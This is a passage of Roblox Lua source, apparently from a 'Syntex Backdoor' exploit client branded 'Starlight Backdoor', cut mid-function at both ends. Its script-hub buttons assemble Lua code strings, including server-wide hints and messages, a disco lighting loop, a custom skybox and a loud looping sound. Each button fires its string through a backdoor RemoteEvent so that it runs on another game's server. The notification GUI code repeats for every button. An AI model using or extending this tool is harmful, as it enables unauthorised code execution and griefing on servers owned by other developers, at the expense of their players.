			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_a0);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Hint.LocalScript
local function C_a4()
	local script = G2L["a4"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt

		local command = [[
		    local h = Instance.new("Hint", game.Workspace)
		    h.Text = ']] .. txt.Text .. [['
		    wait(6)
		    h:Destroy()
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_a4);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Message.LocalScript
local function C_a8()
	local script = G2L["a8"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt

		local command = [[
		    local m = Instance.new("Message", game.Workspace)
		    m.Text = ']] .. txt.Text .. [['
		    wait(6)
		    m:Destroy()
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_a8);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Disco.LocalScript
local function C_ac()
	local script = G2L["ac"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
		    local Lighting = game:GetService("Lighting")
		    local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
	
		    local function zigzag(X) 
			    return math.acos(math.cos(X*math.pi))/math.pi
		    end
	
		    local Counter = 0
	
		    Lighting.TimeOfDay = "12:00"
	
		    while wait(0.1) do 
			    ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
			    Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
			    Counter += 0.01
		    end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_ac);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Skybox.LocalScript
local function C_b0()
	local script = G2L["b0"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID.Text

		local command = [[
	        local ID = "]] .. ID .. [["
	        local Skybox = true
	        if Skybox == true then
	            local sky = Instance.new("Sky")
	            sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
	        end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_b0);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Sound.LocalScript
local function C_b4()
	local script = G2L["b4"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID.Text

		local command = [[
		      local tubers93 = Instance.new("Sound")
		      tubers93.Parent = game:GetService("Workspace")
		      tubers93.SoundId = "rbxassetid://]] .. ID .. [["
		      tubers93.Playing = true
		      tubers93.Looped = true
		      tubers93.Pitch = 0.9
		      tubers93.Volume = 10
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_b4);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedHint.LocalScript
local function C_b8()
	local script = G2L["b8"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text

		local command = [[
		      local function write(text,object)
			if object:IsA("Hint") == true then
				local count = object:FindFirstChild("Count")
				if count == nil then
					count = Instance.new("NumberValue")
					count.Parent = object
					count.Name = "Count"
					count.Value = count.Value + 1
				else
					count.Value = count.Value + 1
				end
				local startcount = count.Value
				for i = 1,#text do
					if count.Value == startcount then
						local letter = string.sub(text,i,i)
						object.Text = string.sub(text,1,i)
						wait(0.001)
					else
						break
					end
				end
			end
		end
		local bro = Instance.new("Hint",workspace)
		write("]] .. txt .. [[",bro)
		wait(6)
		bro:Destroy()
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
